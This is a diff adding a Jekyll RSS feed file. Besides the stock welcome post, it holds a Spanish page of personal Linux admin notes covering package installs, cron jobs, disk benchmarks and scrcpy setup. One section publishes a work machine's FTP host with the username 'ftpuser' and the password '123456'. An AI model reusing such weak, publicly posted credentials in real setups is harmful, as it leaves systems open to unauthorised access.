@@ -1,0 +1,1701 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Titulo del blog (archivo config de la carpeta raiz del proyecto jekyll)</title>
+    <description>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</description>
+    <link>http://yourdomain.com/</link>
+    <atom:link href="http://yourdomain.com/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Mon, 09 Aug 2021 15:22:47 -0300</pubDate>
+    <lastBuildDate>Mon, 09 Aug 2021 15:22:47 -0300</lastBuildDate>
+    <generator>Jekyll v3.1.6</generator>
+    
+      <item>
+        <title>Bienvenido a Jekyll</title>
+        <description>&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;Tom&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &#39;Hi, Tom&#39; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 09 Aug 2021 15:13:32 -0300</pubDate>
+        <link>http://yourdomain.com/jekyll/update/2021/08/09/welcome-to-jekyll.html</link>
+        <guid isPermaLink="true">http://yourdomain.com/jekyll/update/2021/08/09/welcome-to-jekyll.html</guid>
+        
+        
+        <category>jekyll</category>
+        
+        <category>update</category>
+        
+      </item>
+    
+      <item>
+        <title>Documento nro 2_2</title>
+        <description>&lt;h1 id=&quot;linux-tips&quot;&gt;&lt;strong&gt;Linux Tips&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lignux.com/como-actualizar-ubuntu-desde-la-terminal/&quot;&gt;Actualizar Linux desde la terminal&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://ubunlog.com/resolver-las-dependencias-de-paquetes/&quot;&gt;Corregir Arbol de Dependencias&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://ubuntu.com/download/desktop/thank-you?country=AR&amp;amp;version=18.04.3&amp;amp;architecture=amd64&quot;&gt;Descargar Ubunto Desktop&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Crear un direcctorio virtual en base a una ruta especifica&lt;/p&gt;
+
+&lt;p&gt;ln -s /home/desauser/terrier-spanish/Users/jorge/scripts/arma_test/person_queries/ pqs_at&lt;/p&gt;
+
+&lt;p&gt;Algunos enlaces interesantes de linux&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.comoinstalarlinux.com/como-usar-el-editor-nano-linux/
+https://www.comoinstalarlinux.com/como-instalar-popcorn-time-en-ubuntu-y-linux-mint/
+https://www.comoinstalarlinux.com
+https://www.comoinstalarlinux.com/citrix-ica-client-para-linux-ubuntu-y-linux-mint/
+https://www.comoinstalarlinux.com/que-hacer-despues-de-instalar-ubuntu-16-04-lts/
+https://www.comoinstalarlinux.com/que-hacer-despues-de-instalar-linux-mint-18-sarah/
+https://www.comoinstalarlinux.com/tres-semanas-con-linux-mint-18/
+https://www.comoinstalarlinux.com/como-instalar-la-nueva-version-de-skype-for-linux/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como desinstalar LibreOffice en Ubuntu&lt;/p&gt;
+
+&lt;p&gt;Para eliminar fuentes y otras dependencias de la instalación oficial de LibreOffice en ubuntu:
+desinstalar libreoffice normalmente y ejecutar los siguientes comandos:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get remove --purge libreoffice*
+sudo apt-get clean
+sudo apt-get autoremove
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Instalar OpenOffice&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://sourceforge.net/projects/openofficeorg.mirror/files/4.0.1/binaries/es/Apache_OpenOffice_4.1.6_Linux_x86-64_install-deb_es.tar.gz
+cd Descargas 
+tar xzvf Apache_OpenOffice_4.1.6_Linux_x86-64_install-deb_es.tar.gz
+cd es/DEBS 
+sudo dpkg -i *.deb 
+Para integrarlo en el menú del linux, y tenerlo disponible en Aplicaciones-Oficina tendremos que hacer lo siguiente. 
+Una vez instalado, instalamos los iconos del menu. 
+cd desktop-integration 
+sudo dpkg -i *.deb 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ftp-en-mi-maquina-del-trabajo&quot;&gt;FTP en mi maquina del trabajo&lt;/h2&gt;
+
+&lt;p&gt;ftp://192.168.137.97:20&lt;br /&gt;
+ftp://192.168.137.97&lt;br /&gt;
+sudo /etc/init.d/vsftpd restart&lt;/p&gt;
+
+&lt;p&gt;Comparto algunos de los videos de capacitacion que tengo.&lt;br /&gt;
+Solo funciona en la red local, desde afuera no se deberia poder acceder&lt;br /&gt;
+host: 192.168.137.97&lt;br /&gt;
+user: ftpuser&lt;br /&gt;
+pass: 123456&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Referencias a comando sed y regex&lt;/strong&gt;&lt;br /&gt;
+http://www.sromero.org/wiki/linux/aplicaciones/uso_de_sed&lt;br /&gt;
+https://likegeeks.com/es/sed-de-linux/ 
+https://www.cyberciti.biz/faq/how-to-use-sed-to-find-and-replace-text-in-files-in-linux-unix-shell/
+sed ‘:a;N;$!ba;s/\nResponse: No te entendí./*****/g’ UMS_result_191217-0926.txt
+reemplazar fin de linea por una cadena determinada.
+https://www.iteramos.com/pregunta/1448/sed-como-puedo-reemplazar-un-salto-de-linea-n&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/4017278/multi-line-regular-expressions-in-visual-studio&quot;&gt;seleccion multi linea en vscode&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://docs.microsoft.com/es-es/visualstudio/ide/using-regular-expressions-in-visual-studio?view=vs-2019&quot;&gt;ayuda RegEx Msoft&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;sed y awk&lt;/strong&gt;&lt;br /&gt;
+https://www.infor.uva.es/~mluisa/talf/docs/labo/L2.pdf&lt;br /&gt;
+**Introducción a la manipulación de texto en sistemas basados en UNIX&lt;br /&gt;
+https://www.ibm.com/developerworks/ssa/aix/library/au-unixtext/index.html&lt;br /&gt;
+Cómo reemplazar varios patrones a la vez, con sed?&lt;br /&gt;
+https://rstopup.com/como-reemplazar-varios-patrones-a-la-vez-con-sed.html&lt;br /&gt;
+-
+sed: unir dos líneas&lt;br /&gt;
+http://linux.dokry.com/sed-unir-dos-lneas.html&lt;/p&gt;
+
+&lt;p&gt;Sed en una-línea&lt;br /&gt;
+https://jinetedeldragon.wordpress.com/2009/06/22/sed-en-una-linea-sed-one-liners-parte-i/&lt;/p&gt;
+
+&lt;p&gt;OR para seleccion en SED sed ‘/.&lt;em&gt;&amp;gt;|Res.&lt;/em&gt;/!d’ temp2.txt&lt;/p&gt;
+
+&lt;p&gt;cron jobs&lt;/p&gt;
+
+&lt;p&gt;https://www.redeszone.net/2017/01/09/utilizar-cron-crontab-linux-programar-tareas/&lt;br /&gt;
+https://blog.desdelinux.net/cron-crontab-explicados/&lt;/p&gt;
+
+&lt;p&gt;para editar el archivo&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo crontab -e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;hacer ejecutable el archivo con los comandos a ejecutar&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod ugo+x consulta.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;carpeta donde guardo los sript a ejecutar con cronjobs&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/desauser/terrier-spanish/Users/jorge/scripts/cron/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00 10,16,17 * * 1,2 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
+20 16,17 * * 1,2,5 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
+00 12 * * 1,2,5 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
+
+35 17 * * 1,2,5 /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
+40 17 * * * /home/desauser/terrier-spanish/Users/jorge/scripts/cron/copyconf.sha
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Arranque Linux en modo consola, sin entorno grafico. O deneter entorno grafico
+http://haciaelcodigoabierto.blogspot.com/2012/08/desactivar-entorno-grafico-para.html
+https://geekland.eu/como-arrancar-en-modo-consola/
+https://ubuntuforums.org/showthread.php?t=1879464
+https://laguialinux.es/desactivar-inicio-automatico-del-entorno-grafico/
+https://www.taringa.net/+linux/como-desactivar-el-entorno-grafico_12nwma
+http://vijamaroylinux.blogspot.com/2009/08/cambiar-inicio-automatico-de-ubuntu-sin.html&lt;/p&gt;
+
+&lt;p&gt;gestores de inicio de sesión y como cambiar el que usas
+https://ubunlog.com/5-gestores-de-inicio-de-sesion-y-como-cambiar-el-que-usas/
+https://lignux.com/como-cambiar-los-distintos-tipos-de-escritorios-que-existen-para-todos-los-gustos-en-gnu-linux/
+https://geekland.eu/reiniciar-el-entorno-escritorio-linux/&lt;/p&gt;
+
+&lt;p&gt;https://ubunlog.com/como-reinstalar-en-entorno-grafico-de-ubuntu-cuando-el-escritorio-no-carga/&lt;/p&gt;
+
+&lt;p&gt;https://drivemeca.blogspot.com/2016/04/como-instalar-y-configurar-ubuntu.html
+ | Como instalar y configurar Ubuntu Server 16.04 LTS paso a paso ~ videoJuegos y Open Source
+https://profesorweb.es/2013/01/como-instalar-una-interfaz-grafica-en-ubuntu-server-12-04-lts/
+ | Cómo instalar una interfaz gráfica en Ubuntu Server 12.04 LTS - Profesor Web
+https://drivemeca.blogspot.com/2015/12/como-instalar-interfaz-grafica-en.html
+ | Como instalar interfaz grafica en Ubuntu server paso a paso ~ videoJuegos y Open Source&lt;/p&gt;
+
+&lt;p&gt;Benchmarks varios en Linux&lt;/p&gt;
+
+&lt;h5 id=&quot;conocer-espacio-en-disco&quot;&gt;Conocer espacio en disco&lt;/h5&gt;
+&lt;p&gt;Para conocer la denominacion de las unidades&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;df -h&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dd mide grabacion  
+hsparam mide lectura   para instalar ioping   `apt-get install ioping`
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Midiendo velocidad de lectura&lt;/p&gt;
+
+&lt;p&gt;Velocidad teorica&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo hdparm -I /dev/sda | grep -i speed&lt;/code&gt;&lt;br /&gt;
+Informe mas detalado&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo hdparm -I /dev/sda&lt;/code&gt;&lt;br /&gt;
+Velocidad real del disco&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo hdparm -tT /dev/sda&lt;/code&gt;&lt;br /&gt;
+Sin caché de lectura y tres veces seguidas&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;for i in 1 2 3; do sudo hdparm -tT --direct /dev/sda; done&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Midiendo velocidad de grabación&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo dd if=/dev/zero of=test bs=64k count=16k conv=fdatasync&lt;/code&gt;&lt;br /&gt;
+otro comando similar&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo dd if=/dev/zero of=test bs=64k count=16k conv=fdatasync &amp;amp;&amp;amp; rm -rf test&lt;/code&gt;&lt;br /&gt;
+Otro que da resultados mas bajos&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo dd if=/dev/zero of=/tmp/test.dat bs=512 count=2000000 conv=fdatasync&lt;/code&gt;&lt;br /&gt;
+Velocidad de escritura en pendrive
+of=nombre del dispositivo&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo dd if=/dev/zero of=/media/javier/MULTISYSTEM/test.dat bs=512 count=2000000 conv=fdatasync&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Lo que hace este comando es escribir un datos aleatorios un archivo de 1Gb de tamaño.
+mas de 70mb/s es un valor aceptable  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Midiendo latencia&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;ioping -c 10 .&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;avg menos de 250us sería lo recomendable
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;–&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.desdelinux.net/medir-velocidad-de-hdd-con-dd/&quot;&gt;Con el comando dd:&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.javierrguez.com/medir-la-velocidad-de-un-disco-duro-con-ubuntu/&quot;&gt;Mas detalle del dd&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://blog.desdelinux.net/medir-rendimiento-de-hdd-hdparm/&quot;&gt;Velocidad teorica y real&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://librematica.es/blogs/comprobar-velocidad-conexion-disco-duro-linux&quot;&gt;Otro con un programa que se debe instalar&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.neoguias.com/rendimiento-disco-duro-servidor-linux/&quot;&gt;Medir latencia del disco&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://geekland.eu/velocidad-lectura-y-escritura-disco/&quot;&gt;Mejor explicada y con info para probar tambien pendrive&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://www.redeszone.net/2017/07/22/como-analizar-la-salud-de-nuestro-disco-duro-en-linux/&quot;&gt;Test de disco en segundo plano&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://protegermipc.net/2017/05/31/raspberry-pi-benchmark-de-sistema-con-sysbench/&quot;&gt;Testeo general modular&lt;/a&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install sysbench&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;prueba-de-cpu&quot;&gt;Prueba de CPU&lt;/h3&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sysbench --test=cpu --cpu-max-prime=20000 run --num-threads=4&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sysbench --test=cpu run&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sysbench --test=cpu run --num-threads=2&lt;/code&gt;&lt;br /&gt;
+donde 20000 es la cantidad a ejecutar y 4 el el nro de cpu a utilizar&lt;/p&gt;
+
+&lt;p&gt;Prueba de Mermoria&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sysbench --test=memory --memory-block-size=1M --memory-total-size=10G run&lt;/code&gt;&lt;br /&gt;
+Si se modifica 1M por 1K suben bastante los tiempos&lt;/p&gt;
+
+&lt;p&gt;Prueba de disco&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sysbench --test=fileio --file-total-size=50G prepare cleanup&lt;/code&gt; &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sysbench --test=fileio --file-total-size=50G cleanup&lt;/code&gt; &lt;br /&gt;
+50G tiene que ser un valor mayor que la memoria ram, para que no se desvirtue el resultado por la cachá de memoria
+El segundo comando se ejecuta para que elimine los archivos temporales del test.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ubunlog.com/como-instalar-y-usar-hardinfo-informacion-exhaustiva-de-tu-pc-con-ubuntu/&quot;&gt;Con Entorno grafico similar a AIDA&lt;/a&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install hardinfo&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.vicente-navarro.com/blog/2007/10/28/linux-no-mata-discos-duros-se-mueren-solos/&quot;&gt;Para saber cuantas paradas tiene el disco&lt;/a&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;smartctl -a /dev/hdc | egrep &#39;ID|Load_Cycle&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Hacer booteable USB&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.desdelinux.net/haz-de-tu-usb-una-navaja-suiza-con-multisystem/&quot;&gt;MultiSystem&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://blog.desdelinux.net/crear-pendrive-multiboot-multibootusb/&quot;&gt;Cómo crear un Pendrive multiboot con MultiBootUSB&lt;/a&gt;&lt;br /&gt;
+sudo ./install-depot-multisystem.sh&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://code.visualstudio.com/Download&quot;&gt;Página de descarga de Visual Studio Code&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;lunux-apps&quot;&gt;&lt;strong&gt;Lunux Apps&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Programa para probar web services&lt;br /&gt;
+Postman&lt;/p&gt;
+
+&lt;p&gt;lazygit&lt;/p&gt;
+
+&lt;p&gt;Pasos para instalar&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo add-apt-repository ppa:lazygit-team/daily&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt update&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt install lazygit&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Instalar android Studio en Linux&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo snap install android-studio --classic&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;scrcpy-acceso-remoto-teléfono-android-sin-root&quot;&gt;scrcpy (Acceso remoto teléfono android sin root)&lt;/h3&gt;
+
+&lt;p&gt;https://elandroidelibre.elespanol.com/2018/04/controlar-tu-smartphone-android-pc-sin-root.html
+https://ubunlog.com/scrcpy-ubuntu-controla-android/
+https://github.com/Genymobile/scrcpy&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo snap install scrcpy&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Para ejecutar por cable&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;scrcpy -S -m 640&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Para configurar adb si fuera necesario para wifi&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;adb tcpip 5555&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;adb connect 192.168.1.44:5555&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Para ejecutar por wifi&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;scrcpy -S -b2M -m640&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Un poquito mas decorados pero no hacen al funcionamiento
+scrcpy -S -m1024 –window-title ‘My device’
+scrcpy -S -m1024 –window-title ‘My device’ –window-borderless&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/Genymobile/scrcpy#shortcuts&quot;&gt;Atajos de teclado&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;resetter-restablecer-linux-a-su-estado-original-sin-formatear&quot;&gt;Resetter (Restablecer Linux a su estado original sin formatear)&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://ubunlog.com/restablecer-ubuntu-resetter/&quot;&gt;Resetter&lt;/a&gt;&lt;br /&gt;
+https://github.com/gaining/Resetter&lt;/p&gt;
+
+&lt;p&gt;Codecs Varios para Ubuntu&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt-get install ubuntu-restricted-extras&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Configurar teclado&lt;/p&gt;
+
+&lt;p&gt;https://andalinux.wordpress.com/2008/08/08/configurar-teclado-ubuntu-correctamente-en-castellano/&lt;/p&gt;
+
+&lt;p&gt;Analizamos las shell más populares para la terminal de Linux&lt;br /&gt;
+https://hipertextual.com/archivo/2014/09/shell-para-linux/&lt;/p&gt;
+
+&lt;h2 id=&quot;owncloud-tipo-dropbox-&quot;&gt;OwnCloud (Tipo Dropbox )&lt;/h2&gt;
+&lt;p&gt;Cómo crear tu propia nube con ownCloud paso a paso&lt;br /&gt;
+https://hipertextual.com/archivo/2014/10/owncloud/&lt;br /&gt;
+Una vez instalado docker
+docker pull owncloud
+        docker run -d -p 80:80 owncloud:8.1&lt;/p&gt;
+
+&lt;p&gt;Cómo tener una nube privada con Ubuntu Server y Nextcloud&lt;br /&gt;
+https://ubunlog.com/como-tener-una-nube-privada-con-ubuntu-server-y-nextcloud/&lt;br /&gt;
+convierte tu PC vieja en una nube privada personal&lt;br /&gt;
+https://hipertextual.com/2018/08/aplicaciones-nube-privada-personal&lt;/p&gt;
+
+&lt;p&gt;rclone: Gestionando nuestros servicios de almacenamiento en la nube&lt;br /&gt;
+https://www.josedomingo.org/pledin/2019/11/rclone-almacenamiento-nube/&lt;/p&gt;
+
+&lt;p&gt;Gestionando nuestro almacenamiento en la nube con nextcloud y rclone
+https://www.josedomingo.org/pledin/2019/11/almacenamiento-nube-nextcloud-rclone/&lt;/p&gt;
+
+&lt;p&gt;La solución cuando Linux no reconoce tu WiFi&lt;br /&gt;
+https://johnti.es/2018/03/20/la-solucion-cuando-linux-no-reconoce-tu-wifi/&lt;br /&gt;
+Como conectarse a una red WPA en linea de ordenes con nmcli&lt;br /&gt;
+https://www.wifi-libre.com/topic-604-como-conectarse-a-una-red-wpa-en-linea-de-ordenes-con-nmcli.html&lt;/p&gt;
+
+&lt;p&gt;cambiar fecha y hora desde terminal&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;date --set &quot;2017-10-17 01:16&quot;&lt;/code&gt;&lt;br /&gt;
+con un reloj de intentet&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;ntpdate -u hora.roa.es&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Cambiar teclas del teclado (Remapper)&lt;br /&gt;
+con xev para conocer como es cada tecla&lt;br /&gt;
+ xmodmap -e “keycode 135 = Next” &lt;br /&gt;
+ xmodmap -e “keycode 94 = Control_R”&lt;/p&gt;
+
+&lt;p&gt;Shell de Linux verifica sintaxis y buenas prácticas(bash y sh).&lt;br /&gt;
+https://www.shellcheck.net&lt;/p&gt;
+
+&lt;h2 id=&quot;administrar-la-memoria-virtual-en-ubuntu-1804-lts&quot;&gt;Administrar la memoria virtual en Ubuntu 18.04 LTS&lt;/h2&gt;
+&lt;p&gt;http://somebooks.es/administrar-la-memoria-virtual-ubuntu-18-04-lts/&lt;br /&gt;
+sudo sysctl -w vm.swappiness=10&lt;/p&gt;
+
+&lt;p&gt;Ajustar la apariencia de Ubuntu 18.04 LTS con Gnome Tweaks&lt;br /&gt;
+http://somebooks.es/ajustar-la-apariencia-ubuntu-18-04-lts-gnome-tweaks/&lt;/p&gt;
+
+&lt;p&gt;Instalar GNOME Shell Extensions en Ubuntu 18.04 LTS&lt;br /&gt;
+http://somebooks.es/instalar-gnome-shell-extensions-ubuntu-18-04-lts/&lt;/p&gt;
+
+&lt;p&gt;Suspender o hibernar Ubuntu 18.04 LTS y Gnome Shell&lt;br /&gt;
+http://somebooks.es/suspender-hibernar-ubuntu-18-04-lts/&lt;/p&gt;
+
+&lt;p&gt;Cómo hibernar o suspender mediante comandos en la terminal&lt;br /&gt;
+https://blog.desdelinux.net/como-hibernar-o-suspender-mediante-comandos-en-la-terminal/&lt;/p&gt;
+
+&lt;p&gt;Programas gratis para Linux que no pueden faltar en tu PC (App Grid)&lt;br /&gt;
+https://computerhoy.com/noticias/software/programas-gratis-linux-que-no-pueden-faltar-tu-pc-74965&lt;/p&gt;
+
+&lt;p&gt;Las mejores apliEntorno gráfico remoto usando open-ssh&lt;br /&gt;
+https://linuxparalasmasas.wordpress.com/2007/08/27/6/
+caciones y herramientas gratis de 2019 para GNU/Linux&lt;br /&gt;
+https://www.xataka.com/basics/mejores-aplicaciones-herramientas-gratis-2019-para-gnu-linux&lt;/p&gt;
+
+&lt;p&gt;Controlar la temperatura de nuestro equipo con Psensor en Linux (Psensor)&lt;br /&gt;
+https://slimbook.es/tutoriales/linux/297-controlar-la-temperatura-de-nuestro-equipo-con-psensor-en-linux&lt;/p&gt;
+
+&lt;p&gt;Whatsapp desktop&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo snap install whatsdesk&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Docket Basico&lt;br /&gt;
+https://www.one-tab.com/page/KY70_eNaSCC73sv05UxfbQ&lt;/p&gt;
+
+&lt;p&gt;=======
+Como establecer una conexion remota SSH&lt;br /&gt;
+https://www.adslzone.net/redes/linux/como-establecer-una-conexion-ssh-en-linux/&lt;/p&gt;
+
+&lt;p&gt;Tunear un servidor SSH&lt;br /&gt;
+https://www.redeszone.net/gnu-linux/servidor-ssh-en-ubuntu/&lt;/p&gt;
+
